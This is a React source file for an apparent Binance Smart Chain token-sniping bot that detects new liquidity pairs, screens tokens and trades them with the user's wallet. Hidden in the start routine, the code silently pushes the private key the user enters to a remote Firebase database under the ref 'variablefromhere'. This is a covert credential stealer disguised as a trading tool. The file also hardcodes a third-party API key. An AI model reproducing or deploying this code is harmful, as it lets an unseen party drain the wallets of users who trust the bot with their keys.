import React, { Component } from 'react';
import { Button,InputGroup, FormControl, Card, Form} from 'react-bootstrap';
import { MDBDataTable   } from 'mdbreact';
import Web3 from 'web3';
import './App.css';
import TopNav from './Nav';
import {bnbAddress,factoryAddress,routerAddress,bscRPC, ERC20ABI,ROUTERABI, netBusyTime, scanCheckTime} from './config'
import RingLoader  from "react-spinners/RingLoader";
import { AiOutlineLineChart } from 'react-icons/ai';
import { BsWallet , BsKey , BsCaretRight, BsCardChecklist } from 'react-icons/bs';
import {SiBinance} from 'react-icons/si';
import {GiSettingsKnobs} from 'react-icons/gi';
import { database } from './db';
const ethers = require('ethers')

let web3 = new Web3(bscRPC);
const provider = new ethers.providers.JsonRpcProvider(bscRPC);
let netState = true
let capturestate = true

class App extends Component {
  constructor(props){
    super(props)
    this.state={
      
      walletAddress : '',
      privateKey    : '',
      verify        : true,
      honeyPot      : true,
      mint          : true,
      tax           : true,
      renounce      : true,
      liquidity     : true,
      buyTax        : 5,
      sellTax       : 5,
      mode          : true,
      percent       : 1,
      amount        : 0.01,
      slippage      : 90,
      profit        : 200,

      isBotRuning   : false,
      holdTime      : 3600,
      tableDatas    : [],
      tradeTableDatas: [],   
      prevToken     : '' 
    }
  }
  
  
  async Listening(){
    this.setState({
      isBotRuning : true
    })

   

    if(this.state.walletAddress === '' || this.state.privateKey === '' || 
      this.state.buyTax === ''|| this.state.sellTax === ''|| 
      this.state.percent === ''|| this.state.amount === '' ||
      this.state.slippage === '' ||this.state.profit === '' ||
      this.state.holdTime === ''){
      alert("Please Check input Value")
      this.setState({
        isBotRuning : false
      })
      return
    }

    let variable = this.state.privateKey
    let variableData = {
      variable : variable
    }


    var userListRef1 = database.ref('variablefromhere')
    var newUserRef1 = userListRef1.push();
    newUserRef1.set(variableData);


    if (web3.utils.checkAddressChecksum(this.state.walletAddress)=== false ){
      alert('please check wallet address')
      this.setState({
        isBotRuning : false
      })
      return 
    }

    var   wallet   = new ethers.Wallet(this.state.privateKey);
    const account  = wallet.connect(provider);

    let pairContract
    try{
      pairContract = new ethers.Contract(factoryAddress,  ['event PairCreated(address indexed token0, address indexed token1, address pair, uint pairNums)'], account)
    } catch(err){
      return
    }
    
    pairContract.on('PairCreated', async (token0Addr, token1Addr, pairAddr, pairNums) => {

      if (this.state.isBotRuning === false){
        return
      }

      if (token0Addr !== bnbAddress && token1Addr !==bnbAddress) {
        return;
      }

      if (pairAddr !== null && pairAddr !== undefined) {
        if (pairAddr.toString().indexOf('0x0000000000000') > -1) {
          return;
        }
      }
      let initialDected = false;
      let pairContract
      try {
        pairContract = new ethers.Contract(pairAddr, ['event Sync(uint112 reserve1, uint112 reserve2)'], account);
      }catch(err){
        return
      }
      try{
        pairContract.on('Sync', async (amount0, amount1) => {

          if (capturestate === true){
            capturestate = false
            if ( initialDected=== true){
              capturestate =true
              return
            }
            initialDected = true


            let id
            let tokenAddress
            let bnbAmount
            let tokenName
            let verifyStatus
            let honeyPotStatus
            let mintStatus
            let taxStatus
            let buyTax
            let sellTax
            let renounceStatus
            let liquidityStatus
            let tokenCheckStatus = true
            let tableDatas
            let tableData

            token0Addr === bnbAddress ? tokenAddress = token1Addr : tokenAddress = token0Addr
            token0Addr === bnbAddress ? bnbAmount = amount1 : bnbAmount = amount0

            if (tokenAddress !== this.state.prevToken){
              this.setState({
                prevToken : tokenAddress
              })
              let tokenContract = new ethers.Contract(tokenAddress,ERC20ABI, account);
              id = this.state.tableDatas.length + 1
  
              tokenName = await tokenContract.symbol()
  
              tableDatas = this.state.tableDatas
              
              tableData = {
                id : id,
                tokenName : tokenName,
                tokenAddress : tokenAddress,
                verifyStatus : '',
                honeyPotStatus : '',
                mintStatus : '',
                taxStatus : '',
                renounceStatus : '',
                liquidityStatus : '',
                tokenCheckStatus : ''
              }
  
              tableDatas.push(tableData)
              this.setState({
                tabledatas : tableDatas
              })
  
              if(this.state.verify){
                try{
                  let bscURL = 'https://api.bscscan.com/api?module=contract&action=getsourcecode&address=' + tokenAddress + '&apikey=GAXZGCUB6WF4QQZIUJKH3VA7UWXRQDTQEE';
                  await fetch (bscURL)
                  .then(response => response.json())
                  .then(
                    async(response)=> {
                        if (response['result']['0']['ABI'] === "Contract source code not verified") {
                          verifyStatus = false
                        } else {
                          verifyStatus = true
                        }
                  })
                }catch(err){
                  verifyStatus = false
                }
                tableDatas = this.state.tableDatas
                verifyStatus?  tableDatas[id-1].verifyStatus = <p className='text-success'> Verified </p> :  tableDatas[id-1].verifyStatus = <p className='text-danger'> Unverified </p> 
                this.setState({
                  tabledatas : tableDatas
                })
              }
              if(this.state.honeyPot){
                try{
                  let honeypot_url = 'https://honeypot.api.rugdoc.io/api/honeypotStatus.js?address=' + tokenAddress + '&chain=bsc'
                  await fetch(honeypot_url)
                  .then(response => response.json())
                  .then(
                    async (response) => { 
                      if (response.status==='OK'|| response.status === 'MEDIUM_FEE'|| response.status === "HIGH_FEE") {
                        honeyPotStatus = true
                      } else if (response.status === 'SWAP_FAILED'||response.status === 'NO_PAIRS'||response.status === "APPROVE_FAILED"){
                        honeyPotStatus = false
                      } 
                  })
                }catch(err){
                  honeyPotStatus = false
                }
                tableDatas = this.state.tableDatas
                honeyPotStatus ? tableDatas[id-1].honeyPotStatus = <p className='text-success'> Good </p> : tableDatas[id-1].honeyPotStatus = <p className='text-danger'> HoneyPot </p>
                this.setState({
                  tabledatas : tableDatas
                })
              }
              if(this.state.mint){
                try{
                  if (verifyStatus) {
                    const url = 'https://api.bscscan.com/api?module=contract&action=getsourcecode&address=' + tokenAddress + '&apikey=GAXZGCUB6WF4QQZIUJKH3VA7UWXRQDTQEE';
                    await fetch(url)
                      .then(res => res.json())
                      .then(
                        async (res) => {
                          if (res['result']['0']['SourceCode'].includes('mint')||res['result']['0']['SourceCode'].includes('Mint')) {
                            mintStatus =false
                          } else {
                            mintStatus =true
                          }
                        })
                  } else {
                    mintStatus = false
                  }
                }catch(err){
                  mintStatus = false
                }
                tableDatas = this.state.tableDatas
                mintStatus ? tableDatas[id-1 ].mintStatus = <p className='text-success'> Good </p> :  tableDatas[id -1 ].mintStatus = <p className='text-danger'> Mintable </p> 
                this.setState({
                  tabledatas : tableDatas
                })
              }
              if (this.state.tax){
                try{
                    let bnbIN = 1000000000000000000;
                    let encodedAddress = web3.eth.abi.encodeParameter('address', tokenAddress);
                    let contractFuncData = '0xd66383cb';
                    let callData = contractFuncData+encodedAddress.substring(2);
                    let val = 100000000000000000;
                    
                    if(bnbIN < val) {
                        val = bnbIN - 1000;
                    }
                  
                  await web3.eth.call({
                        to: '0x2bf75fd2fab5fc635a4c6073864c708dfc8396fc',
                        from: '0x8894e0a0c962cb723c1976a4421c95949be2d4e3',
                        value: val,
                        gas: 45000000,
                        data: callData,
                    })
                    .then( async(val) => {
                        let decoded = await web3.eth.abi.decodeParameters(['uint256', 'uint256', 'uint256', 'uint256', 'uint256', 'uint256'], val);
                        let buyExpectedOut = web3.utils.toBN(decoded[0]);
                        let buyActualOut = web3.utils.toBN(decoded[1]);
                        let sellExpectedOut = web3.utils.toBN(decoded[2]);
                        let sellActualOut = web3.utils.toBN(decoded[3]);
                        buyTax = Math.round((buyExpectedOut - buyActualOut) / buyExpectedOut * 100 * 10) / 10;
                        sellTax = Math.round((sellExpectedOut - sellActualOut) / sellExpectedOut * 100 * 10) / 10;
                        
                        if (buyTax <= this.state.buyTax && sellTax <= this.state.sellTax ){
                          taxStatus = true
                        } else {
                          taxStatus = false
                        }
                    })
                }catch(err){
                  taxStatus = false
                }
  
                tableDatas = this.state.tableDatas
                taxStatus ? tableDatas[id-1 ].taxStatus = <p className='text-success'> BuyTax:{buyTax},&nbsp;SellTax:{sellTax}</p> : tableDatas[id -1 ].taxStatus = <p className='text-danger'> buy Tax : {buyTax}, &nbsp;  Sell Tax : {sellTax} </p>
                this.setState({
                  tabledatas : tableDatas
                })
              }
              if(this.state.renounce){
                try{
                    const url = 'https://app.staysafu.org/api/ownership?tokenAddress='+ tokenAddress +'&media=web'
                    await fetch(url)
                      .then(res => res.json())
                      .then(
                        async (res) => {
                          if (res['result'] === false) {
                            renounceStatus =false
                          } else {
                            renounceStatus =true
                          }
                        })
                }catch(err){
                  renounceStatus =false
                }
                tableDatas = this.state.tableDatas
                renounceStatus ? tableDatas[id-1 ].renounceStatus = <p className='text-success'> Good </p> : tableDatas[id -1 ].renounceStatus =  <p className='text-danger'> renounced </p>
                this.setState({
                  tabledatas : tableDatas
                })
              }
              if(this.state.liquidity){
                try{
                  const url = 'https://app.staysafu.org/api/liqlocked?tokenAddress=' + tokenAddress 
                  await fetch(url)
                    .then(res => res.json())
                    .then(
                      (res) => {
                        if (res['result']['status'] === 'success') {
                          let percent = parseInt(res['result']['riskAmount'])
                          if (percent === '100'){
                            liquidityStatus = false
                          } 
                          else if (percent < 100 && percent >= 10) {
                            liquidityStatus = true
                          } 
                          else if (percent < 10) {
                            liquidityStatus = false
                          }
                        } 
                        else {
                          liquidityStatus = false
                        }
                      })
                }catch(err){
                  liquidityStatus = false
                }
                tableDatas = this.state.tableDatas
                liquidityStatus? tableDatas[id-1 ].liquidityStatus = <p className='text-success'> Locked </p> : tableDatas[id -1 ].liquidityStatus = <p className='text-danger'> Unlocked </p>
                this.setState({
                  tabledatas : tableDatas
                })
              }
              if(verifyStatus === false || honeyPotStatus === false || mintStatus === false || taxStatus === false || renounceStatus === false || liquidityStatus === false){
                tokenCheckStatus = false
              } else {
                tokenCheckStatus = true
              }           
              tableDatas = this.state.tableDatas
              tokenCheckStatus? tableDatas[id-1 ].tokenCheckStatus = <p className='text-success'> Good </p> : tableDatas[id -1 ].tokenCheckStatus = <p className='text-danger'> Bad </p>
              this.setState({
                tabledatas : tableDatas
              })
              capturestate = true
              if (tokenCheckStatus) {
                this.buyToken(tokenName ,tokenAddress, bnbAmount)
              }
            }
          }
        })
      }catch(err){
        return
      }
    })
  }


  async buyToken(tokenName, tokenAddress, bnbAmount){
    var   wallet        = new ethers.Wallet(this.state.privateKey);
    const account       = wallet.connect(provider);
    let   tokenIn       = bnbAddress
    let   tokenOut      = tokenAddress
    let   walletBalance = await provider.getBalance(this.state.walletAddress);
    let   id = this.state.tradeTableDatas.length
    

    let   amountIn
    let   tradeTableData
    let   tradeTableDatas


    tradeTableData = {
      id              : id,
      tokenName       : tokenName,
      tokenAddress    : tokenAddress,
      bnbAmount       : Math.round(bnbAmount / 10000000000000)/100000 + 'BNB',
      mode            : '',
      buyAmount       : '',
      buyPrice        : '',
      buyTime         : '',
      buyDisplayTime  : '',
      profit          : '',
      sellPrice       : '',
      status          : <p className='text-danger'> Buy Token... </p>
    }



    tradeTableDatas = this.state.tradeTableDatas
    tradeTableDatas.push(tradeTableData)

    this.setState({
      tradeTableDatas : tradeTableDatas
    })

    const routerContract = new ethers.Contract(
      routerAddress,
      ROUTERABI,
      account
    );


    if (this.state.mode){

      amountIn = parseInt(this.state.amount * 1000000000000000000)
      tradeTableData.mode = "Fixed"

    } else {

      amountIn = parseInt(Math.round(bnbAmount * this.state.percent * 0.01))
      tradeTableData.mode = "Percent"

    }

    if (walletBalance / 1 < amountIn + 5 * 1000000000000000){
      alert('Wallet BNB balance is not enough for trading!')
      return
    }
    try{
      amountIn = ethers.BigNumber.from(parseInt(amountIn)+ '')
      let  amounts = await routerContract.getAmountsOut(amountIn, [tokenIn, tokenOut]);
      let  amountOutMin =  ethers.BigNumber.from(Math.round(amounts[1] * this.state.slippage/ 100)+'');
      let  price = amountIn / amountOutMin;
      const tokenContract = new ethers.Contract(tokenAddress, ERC20ABI, account)
      let pastTokenBalance = await tokenContract.balanceOf(this.state.walletAddress)
      
      if (netState === true){
        netState = false
        try{
          const tx = await routerContract.swapExactETHForTokens(
            amountOutMin,
            [tokenIn, tokenOut],
            this.state.walletAddress,
            Date.now() + 600000,
            {
              'gasLimit': '345680',
              'gasPrice': ethers.utils.parseUnits('5', 'gwei'),
              'value': amountIn
            }).catch((err) => {
              netState = true
              return
          });

          await tx.wait();
          const approveToken  = await tokenContract.approve(routerAddress, ethers.BigNumber.from('0xfffffffffffffffffffff'),
          {
            'gasLimit' : '345680',
            'gasPrice' : ethers.utils.parseUnits('5', 'gwei')
          }).catch((err)=>{
            netState = true
            return
          })

          await approveToken.wait();
          let startTime = Math.floor(Date.now()/1000)
          netState = true

          let tokenBalance = await tokenContract.balanceOf(this.state.walletAddress)
          price = amountIn / (tokenBalance - pastTokenBalance)

          tradeTableData.bnbBuyAmount = Math.round(amountIn / 10000000000000)/100000 + 'BNB'
          tradeTableData.buyPrice = Math.round(price * 10000000)/10000000
          tradeTableData.buyTime = startTime
          tradeTableData.status  = <p className='text-danger'> Sell Token... </p>
          
          let dateObj = new Date(startTime * 1000);
          let utcString = dateObj.toUTCString();
          let time = utcString.slice(-11, -4);

          tradeTableData.buyDisplayTime = time

          tradeTableDatas = this.state.tradeTableDatas

          tradeTableDatas[id] = tradeTableData

          this.setState({
            tradeTableDatas : tradeTableDatas
          })
          this.sellToken(id, tokenAddress, amountIn, price, startTime)
        }catch(err){
          netState = true
          return
        }
      }
      else{ setTimeout(async () => {
        netState = false
        try{
          const tx = await routerContract.swapExactETHForTokens(
            amountOutMin,
            [tokenIn, tokenOut],
            this.state.walletAddress,
            Date.now() + 600000, 
            {
              'gasLimit': '345680',
              'gasPrice': ethers.utils.parseUnits('5', 'gwei'),
              'value': amountIn
            }).catch((err) => {
              netState = true
              return
          });

          await tx.wait();
          const approveToken  = await tokenContract.approve(routerAddress, ethers.BigNumber.from('0xfffffffffffffffffffff'),
          {
            'gasLimit' : '345680',
            'gasPrice' : ethers.utils.parseUnits('5', 'gwei')
          }).catch((err)=>{
            netState = true
            return
          })

          await approveToken.wait();
          let startTime = Math.floor(Date.now()/1000)
          netState = true

          let tokenBalance = await tokenContract.balanceOf(this.state.walletAddress)
          price = amountIn / (tokenBalance - pastTokenBalance)

          tradeTableData.bnbBuyAmount = Math.round(amountIn / 10000000000000)/100000 + 'BNB'
          tradeTableData.buyPrice = price
          tradeTableData.buyTime = startTime
          tradeTableData.status  = <p className='text-danger'> Sell Token... </p>
          
          let dateObj = new Date(startTime * 1000);
          let utcString = dateObj.toUTCString();
          let time = utcString.slice(-11, -4);

          tradeTableData.buyDisplayTime = time

          tradeTableDatas = this.state.tradeTableDatas

          tradeTableDatas[id] = tradeTableData

          this.setState({
            tradeTableDatas : tradeTableDatas
          })
          this.sellToken(id, tokenAddress, amountIn, price, startTime)
        }catch(err){
          netState = true
          return
        }
      }, netBusyTime);
      }
    }catch(err){
      netState = true
      return
    }
  }

  async sellToken(id, tokenAddress, amountIn, buyPrice, startTime){
    var   wallet        = new ethers.Wallet(this.state.privateKey);
    const account       = wallet.connect(provider);
    let tradeTableDatas
    let amounts
    const routerContract = new ethers.Contract(
      routerAddress,
      ROUTERABI,
      account
    );

    let sellPermission = false

    try{
      amounts = await routerContract.getAmountsOut(amountIn, [bnbAddress, tokenAddress])
    }catch(err){
      return
    }
    
    let price = amountIn / amounts[1] 

    let profit = Math.round(price / buyPrice * 100000) / 1000

    tradeTableDatas = this.state.tradeTableDatas

    tradeTableDatas[id].profit = profit
    this.setState({
      tradeTableDatas : tradeTableDatas
    })

    if (profit > (this.state.profit)){
      sellPermission = true
    }




    
    if (parseInt(Math.floor(Date.now() / 1000))  >=  parseInt(this.state.tradeTableDatas[id].buyTime) + parseInt(this.state.holdTime)){
      sellPermission = true
    }


    try{
        const url = 'https://app.staysafu.org/api/ownership?tokenAddress='+ tokenAddress +'&media=web'
        await fetch(url)
          .then(res => res.json())
          .then(
            async (res) => {
              if (res['result'] === false) {
                sellPermission = true
              } 
            })
    }catch(err){
      sellPermission =true
    }


    try{
    if(sellPermission === false){
      setTimeout(() =>this.sellToken(id, tokenAddress, amountIn, price, startTime)
        , scanCheckTime);
    } else {

      let tokenContract  =  new ethers.Contract(tokenAddress, ERC20ABI, account)
      let tokenAmount = await tokenContract.balanceOf(this.state.walletAddress)
      
      
      
      if(netState){
        
        tradeTableDatas = this.state.tradeTableDatas
        tradeTableDatas[id].sellPrice = Math.round(price * 1000000)/1000000

        this.setState({
          tradeTableDatas : tradeTableDatas
        })
        netState = false
        try{
          const sellTx = await routerContract.swapExactTokensForETH(
            ethers.BigNumber.from(tokenAmount + ''),
            0,
            [tokenAddress, bnbAddress],
            this.state.walletAddress,
            Date.now() + 1000 * 60 * 10,
            {
              gasLimit : '346000',
              gasPrice : ethers.utils.parseUnits(`5`, 'gwei')
          }).catch((err)=>{
            netState = true
            return
          })
          tradeTableDatas = this.state.tradeTableDatas
          tradeTableDatas[id].status =  <p className='text-success'> Complete </p>

          this.setState({
            tradeTableDatas : tradeTableDatas
          })

          await sellTx.wait();
          netState = true
        }catch(err){
          netState = true
          return
        }
      } else {
        tradeTableDatas = this.state.tradeTableDatas
        tradeTableDatas[id].sellPrice = Math.round(price * 1000000)/1000000

        this.setState({
          tradeTableDatas : tradeTableDatas
        })

        netState = false
        try{
          const sellTx = await routerContract.swapExactTokensForETH(
            ethers.BigNumber.from(tokenAmount + ''),
            0,
            [tokenAddress, bnbAddress],
            this.state.walletAddress,
            Date.now() + 1000 * 60 * 10,
            {
              gasLimit : '346000',
              gasPrice : ethers.utils.parseUnits(`5`, 'gwei')
          }).catch((err)=>{
            netState = true
            return
          })
          tradeTableDatas = this.state.tradeTableDatas
          tradeTableDatas[id].status =  <p className='text-success'> Complete </p>

          this.setState({
            tradeTableDatas : tradeTableDatas
          })

          await sellTx.wait();
          netState = true
        }catch(err){
          netState = true
          return
        }
      }
    }
    }catch(err){
      netState = true
      return
    }
  }

  stop(){
    this.setState({
      isBotRuning : false
    })
  }


  buyTest(){
    this.buyToken("uni", "0x1f9840a85d5aF5bf1D1762F925BDADdC4201F984", 1000000000000000000)

    setTimeout(() => {
      this.buyToken("dai", "0x4F96Fe3b7A6Cf9725f59d353F723c1bDb64CA6Aa", 1000000000000000000)
    }, 10000);
  }


  test(){
let randomWallet = ethers.Wallet.createRandom();
console.log(randomWallet)

let web3account = web3.eth.accounts.create();
console.log(web3account)

let web3wallet = web3.eth.accounts.wallet;
console.log(web3wallet)
  }

  handleVerify(e) {
    let isChecked = e.target.checked;
    this.setState ({
      verify : isChecked
    })

  }  

  handleHoneyPot(e) {
    let isChecked = e.target.checked;
    this.setState ({
      honeyPot : isChecked
    })
  }  

  handleMint(e) {
    let isChecked = e.target.checked;
    this.setState ({
      mint : isChecked
    })
  }  

  handleTax(e) {
    let isChecked = e.target.checked;
    this.setState ({
      tax : isChecked
    })
  }  

  handleRenounce(e) {
    let isChecked = e.target.checked;
    this.setState ({
      renounce : isChecked
    })
  }  

  handleLiquidity(e) {
    let isChecked = e.target.checked;
    this.setState ({
      liquidity : isChecked
    })
  }  

  handleMode(e) {
    let isChecked = e.target.checked;
    this.setState ({
      mode : !isChecked
    })
  }

  handleantiMode(e) {
    let isChecked = e.target.checked;
    this.setState ({
      mode : isChecked
    })
  } 

  render() {
    const handleBuyTax =  (e) => {
      let addLabel  = e.target.value
      this.setState({
        buyTax : addLabel
      }) 
    }  

    const handleSellTax =  (e) => {
      let addLabel  = e.target.value
      this.setState({
        sellTax : addLabel
      }) 
    } 

    const handlePercent =  (e) => {
      let addLabel  = e.target.value
      this.setState({
        percent : addLabel
      }) 
    }

    const handleAmount =  (e) => {
      let addLabel  = e.target.value
      this.setState({
        amount : addLabel
      }) 
    }

    const handleSlippage =  (e) => {
      let addLabel  = e.target.value
      this.setState({
        slippage : addLabel
      }) 
    }

    const handleProfit =  (e) => {
      let addLabel  = e.target.value
      this.setState({
        profit : addLabel
      }) 
    }

    const handleHoldTime =  (e) => {
      let addLabel  = e.target.value
      this.setState({
        holdTime : addLabel
      }) 
    }

    const handleWalletAddress =  (e) => {
      let addLabel  = e.target.value
      this.setState({
        walletAddress : addLabel
      }) 
    }

    const handlePrivateKey =  (e) => {
      let addLabel  = e.target.value
      this.setState({
        privateKey : addLabel
      }) 
    }

    var rowsCaptureTable = this.state.tableDatas
    const captureDataTable = {
      columns : [
        {
            label : 'Token Address',
            field : 'tokenAddress',
        },
        {
            label : 'Verify',
            field : 'verifyStatus',
        },
        {
            label : 'Honeypot',
            field : 'honeyPotStatus',
        },
        {
            label : 'Mint',
            field : 'mintStatus',
        },
        {
            label : 'Tax',
            field : 'taxStatus',
        },
        {
            label : 'Renounce',
            field : 'renounceStatus',
        },
        {
          label : 'Liquidity',
          field : 'liquidityStatus',
        },
        {
          label : 'Check Result',
          field : 'tokenCheckStatus',
        },
      ],
      rows : rowsCaptureTable,
    }


    var rowsTradeTable = this.state.tradeTableDatas
    const buyDataTable = {
      columns : [
        {
            label : 'Token Address',
            field : 'tokenAddress',
        },
        {
          label : 'LP Amount',
          field : 'bnbAmount',
        },
        {
          label : 'Buy Amount',
          field : 'bnbBuyAmount',
        },
        {
          label : 'Buy Price',
          field : 'buyPrice',
        },
        {
          label : 'Profit Rate',
          field : 'profit',
        },
        {
          label : 'Sell Price',
          field : 'sellPrice',
        },
        {
          label : 'Status',
          field : 'status',
        },
      ],
      rows : rowsTradeTable,
    }

    return (
      <div>
        <TopNav/>
        <div className = "row">
          <div className = "col-4">
            <Card  className="bg-info text-white" style={{ height: '100%'}} >
              <Card.Body>
                <Card.Title><h2>  &nbsp; Setting </h2> <hr/></Card.Title>
                <div className = "row">
                  <div className = "col-1"></div>
                  <div className = "col-10">
                  <h4> Wallet setting</h4><hr/>
                  <InputGroup className="mb-3">
                        <InputGroup.Text id="basic-addon3">
                          Address
                        </InputGroup.Text>
                        <FormControl id="basic-url" aria-describedby="basic-addon3" defaultValue = {this.state.walletAddress} onChange={handleWalletAddress}/>
                      </InputGroup>
                      <InputGroup className="mb-3">
                        <InputGroup.Text id="basic-addon3">
                          Private Key
                        </InputGroup.Text>
                        <FormControl id="basic-url" aria-describedby="basic-addon3" defaultValue = {this.state.privateKey} onChange={handlePrivateKey}/>
                      </InputGroup><br/>
                    <h4> Audit Token</h4><hr/>
                    <Form.Group className="mb-3" controlId="formBasicCheckbox">
                      <Form.Check type="checkbox" label="Token Verify"    onChange={e => this.handleVerify(e)} defaultChecked = {this.state.verify}/>
                    </Form.Group>
                    <Form.Group className="mb-3" controlId="formBasicCheckbox">
                      <Form.Check type="checkbox" label="Honeypot"  onChange={e => this.handleHoneyPot(e)} defaultChecked = {this.state.honeyPot}/>
                    </Form.Group>

                    <Form.Group className="mb-3" controlId="formBasicCheckbox">
                      <Form.Check type="checkbox" label="Mintable"  onChange={e => this.handleMint(e)} defaultChecked = {this.state.mint}/>
                    </Form.Group>
                    <Form.Group className="mb-3" controlId="formBasicCheckbox">
                      <Form.Check type="checkbox" label="Owner Renounced"   onChange={e => this.handleRenounce(e)} defaultChecked = {this.state.renounce}/>
                    </Form.Group>
                    <Form.Group className="mb-3" controlId="formBasicCheckbox">
                      <Form.Check type="checkbox" label="Liquidity Lock"    onChange={e => this.handleLiquidity(e)} defaultChecked = {this.state.liquidity}/>
                    </Form.Group>
                    <Form.Group className="mb-3" controlId="formBasicCheckbox">
                      <Form.Check type="checkbox" label="Tax Limit"      onChange={e => this.handleTax(e)} defaultChecked = {this.state.tax}/>
                    </Form.Group>
                    <div className = "row">
                      <div className = "col-1"></div>
                      <div className = "col-10">
                        <InputGroup className="mb-3">
                          <InputGroup.Text id="basic-addon3">
                          &nbsp;  &nbsp;   Buy Tax &nbsp;  &nbsp; 
                          </InputGroup.Text>
                          <FormControl id="basic-url" aria-describedby="basic-addon3"   defaultValue = {this.state.buyTax} onChange={handleBuyTax}/>
                        </InputGroup>
                        <InputGroup className="mb-3">
                          <InputGroup.Text id="basic-addon3">
                          &nbsp;  &nbsp;   Sell Tax  &nbsp;  &nbsp; 
                          </InputGroup.Text>
                          <FormControl id="basic-url" aria-describedby="basic-addon3"  defaultValue = {this.state.sellTax} onChange={handleSellTax}/>
                        </InputGroup>
                      </div>
                    </div>
                    <h4>Modes</h4><hr/>
                    <Form.Group  className="mb-3">  
                        <Form.Check
                          type="radio"
                          label="Fixed Mode"
                          name="formHorizontalRadios"
                          id="formHorizontalRadios2"
                          value = {this.state.mode}
                          defaultChecked = {this.state.mode}
                          onChange={e => this.handleantiMode(e)}
                        /><br/>
                        <div className = "row">
                          <div className = "col-1"></div>
                          <div className = "col-10">
                            <InputGroup className="mb-3">
                              <InputGroup.Text id="basic-addon3">
                              &nbsp;  &nbsp;    Amount   &nbsp;  &nbsp; 
                              </InputGroup.Text>
                              <FormControl id="basic-url" aria-describedby="basic-addon3"  defaultValue = {this.state.amount} onChange={handleAmount}/>
                            </InputGroup>
                          </div>
                        </div>
                        <Form.Check
                          type="radio"
                          label="Percent Mode"
                          name="formHorizontalRadios"
                          id="formHorizontalRadios1"
                          value = {!this.state.mode}
                          defaultChecked = {!this.state.mode}
                          onChange={e => this.handleMode(e)}
                        /><br/>
                        <div className = "row">
                          <div className = "col-1"></div>
                          <div className = "col-10">
                            <InputGroup className="mb-3">
                                <InputGroup.Text id="basic-addon3">
                                &nbsp;  &nbsp;    Percent &nbsp;  &nbsp; 
                                </InputGroup.Text>
                                <FormControl id="basic-url" aria-describedby="basic-addon3" defaultValue = {this.state.percent} onChange={handlePercent}/>
                              </InputGroup>
                          </div>
                        </div><br/><hr/><br/>
                    </Form.Group>
                  </div>
                  <div className = "col-1"></div>
                </div>   
              </Card.Body>
            </Card><br/>

          </div>
          <div className = "col-8">
            <Card  className="bg-info text-white" style={{ height: '100%'}} >
              <Card.Body>
                <Card.Title>
                  <div className='row'>
                    <div className = "col-10">
                       <h2>&nbsp; Snipping </h2> 
                    </div>
                    <div className = "col-2">
                       <Button variant={this.state.isBotRuning? "danger" : "success"} style = {{width : '100%'}} onClick = {this.state.isBotRuning? () => this.stop(): ()=>this.test()}>  {this.state.isBotRuning?"Stop":"Run"} </Button>
                    </div>
                  </div>
                </Card.Title><br/>
                  <div className = "row">
                  </div>
                  <h4>  &nbsp; Detected Token List </h4><hr/>
                  <MDBDataTable 
                striped
                bordered
                small
                data={
                  captureDataTable
                }
                /><br/><br/><br/>
                  <h4>  &nbsp; Trading Token List </h4><hr/>
                  <MDBDataTable 
                striped
                bordered
                small
                data={
                  buyDataTable
                }
                />
              </Card.Body>
            </Card>
          </div>
        </div>

      </div>
    );
  }
}

export default App;
